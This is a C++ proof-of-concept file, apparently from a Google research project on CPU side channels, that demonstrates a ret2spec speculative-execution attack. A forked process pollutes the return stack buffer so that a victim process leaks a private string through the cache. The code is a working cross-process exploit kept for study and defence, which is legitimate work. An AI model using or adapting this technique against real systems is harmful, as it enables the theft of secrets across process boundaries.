/*
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   https://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

/**
 * Demonstration of ret2spec that exploits the fact that return stack buffers
 * have limited size and they can be rewritten by recursive invocations of
 * another function by another process.
 *
 * We have two functions that we named after their constant return values. One
 * process (the attacker) calls recursively the ReturnsFalse function and yields
 * the CPU in the deepest invocation. This way it leaves the RSB full of return
 * addresses to the ReturnsFalse invocation that are absolutely unreachable from
 * the victim process.
 *
 * The victim process invokes recursively the ReturnTrue function, but before
 * each return it flushes from cache the stack frame that contains the return
 * address. The prediction uses the polluted RSB with return addresses injected
 * by the attacker and the victim jumps to architecturally unreachable code that
 * has microarchitectural side-effects.
 **/

#include <array>
#include <cstring>
#include <iostream>
#include <vector>

#include <sys/types.h>
#include <unistd.h>

#include "cache_sidechannel.h"
#include "instr.h"
#include "local_content.h"
#include "ret2spec_common.h"
#include "utils.h"

// Yield the CPU.
static void Unschedule() {
  sched_yield();
}

int main() {
  return_true_base_case = Unschedule;
  return_false_base_case = Unschedule;
  // Parent PID for the death-checking of the child.
  pid_t ppid = getpid();
  // We need both processes to run on the same core. Pinning the parent before
  // the fork to the first core. The child inherits the settings.
  PinToTheFirstCore();
  if (fork() == 0) {
    // The child (attacker) infinitely fills the RSB using recursive calls.
    while (true) {
      ReturnsFalse(kRecursionDepth);
      // If the parent pid changed, the parent is dead and it's time to
      // terminate.
      if (getppid() != ppid) {
        exit(EXIT_SUCCESS);
      }
    }
  } else {
    // The parent (victim) calls only LeakByte and ReturnTrue, never
    // ReturnFalse.
    std::cout << "Leaking the string: ";
    std::cout.flush();
    for (size_t i = 0; i < strlen(private_data); ++i) {
      current_offset = i;
      std::cout << Ret2specLeakByte();
      std::cout.flush();
    }
  }
  std::cout << "\nDone!\n";
}
